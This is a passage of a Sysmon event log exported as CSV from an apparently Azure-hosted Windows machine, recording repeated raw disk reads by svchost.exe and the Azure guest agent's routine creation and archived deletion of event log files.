UtcTime: 2025-12-17 08:01:54.774
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.691
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.596
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.505
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.422
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.327
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.232
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.137
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.044
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.961
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.878
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.789
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.704
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.615
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.520
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.425
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.338
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.255
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.171
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:53 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:53.081
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:52 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:52.997
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:52 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:52.906
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:52 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:52.823
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:52 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:52.733
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:52 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:52.649
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:52 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:52.553
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:52 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:52.253
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:29.294
ProcessGuid: {f995aebf-633a-6942-e205-000000000e00}
ProcessId: 956
Image: C:\Windows\system32\sppsvc.exe
TargetFilename: C:\Windows\System32\spp\store\2.0\cache\cache.dat
CreationUtcTime: 2025-11-09 10:46:05.741
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:01:20 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:20.790
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:20 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:20.790
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:20 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:20.788
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.897
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Windows Azure.evtx
CreationUtcTime: 2025-12-17 08:01:15.897
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.893
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\System.evtx
CreationUtcTime: 2025-12-17 08:01:15.893
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.877
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Security.evtx
CreationUtcTime: 2025-12-17 08:01:15.877
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.861
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Status9464Plugins.evtx
CreationUtcTime: 2025-12-17 08:01:15.861
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.846
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Status9464GuestAgent.evtx
CreationUtcTime: 2025-12-17 08:01:15.846
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.830
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Diagnostics9464Runtime.evtx
CreationUtcTime: 2025-12-17 08:01:15.830
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.814
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Diagnostics9464Heartbeat.evtx
CreationUtcTime: 2025-12-17 08:01:15.814
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.801
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Diagnostics9464GuestAgent.evtx
CreationUtcTime: 2025-12-17 08:01:15.798
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.785
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Diagnostics9464Bootstrapper.evtx
CreationUtcTime: 2025-12-17 08:01:15.785
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.781
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Application.evtx
CreationUtcTime: 2025-12-17 08:01:15.779
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:01:15.779
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs
CreationUtcTime: 2025-12-17 08:01:15.779
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.275
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Windows Azure.evtx
Hashes: SHA256=F5F9E97A6B1EC8D46A9BD5B9D4CCAE96521B85517B0337B248814D2E974A968B
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.274
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\System.evtx
Hashes: SHA256=2DAF4636FDAB18C5E7632F271CDF1B2884770E9F8480C4CD4ECEEC9A4C77E22A
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.272
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Security.evtx
Hashes: SHA256=89EFA48742A412DEEDDAF901E404665139053F1D7A6D43839ADE25FC0F54ADC9
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.252
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Status9464Plugins.evtx
Hashes: SHA256=B00DD3C746FD11A558E5EEB5CFE119ECC5A9EF41BC0D4B746733C0B6C33776D0
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.250
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Status9464GuestAgent.evtx
Hashes: SHA256=44DDA05957E8D90A07C924338B92FE8A52517F7A49406AA26D67D18A43CF332D
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.250
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Diagnostics9464Runtime.evtx
Hashes: SHA256=F5F9E97A6B1EC8D46A9BD5B9D4CCAE96521B85517B0337B248814D2E974A968B
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.248
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Diagnostics9464Heartbeat.evtx
Hashes: SHA256=3728C1BE100002553F9C0BF00FC9731DE4A4D41CB5BD9CF5940B7259EB767F95
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.244
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Diagnostics9464GuestAgent.evtx
Hashes: SHA256=3FA53619C50C57B45BA5B457C110F2D749FD111834D89ADEE5DFEB3629723047
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.242
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Microsoft-WindowsAzure-Diagnostics9464Bootstrapper.evtx
Hashes: SHA256=F5F9E97A6B1EC8D46A9BD5B9D4CCAE96521B85517B0337B248814D2E974A968B
IsExecutable: false
Archived: true"
"12/17/2025 8:01:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:01:15.242
ProcessGuid: {f995aebf-6343-6942-eb05-000000000e00}
ProcessId: 9464
User: NT AUTHORITY\SYSTEM
Image: C:\WindowsAzure\GuestAgent_2.7.41491.1183_2025-12-08_211052\CollectGuestLogs.exe
TargetFilename: C:\Windows\System32\winevt\EventLogs\Application.evtx
Hashes: SHA256=0C7DA6379D967909A4DC3C3A2735C6BB5C955041554D48CE3A27DBCB6D47A52F
IsExecutable: false
Archived: true"
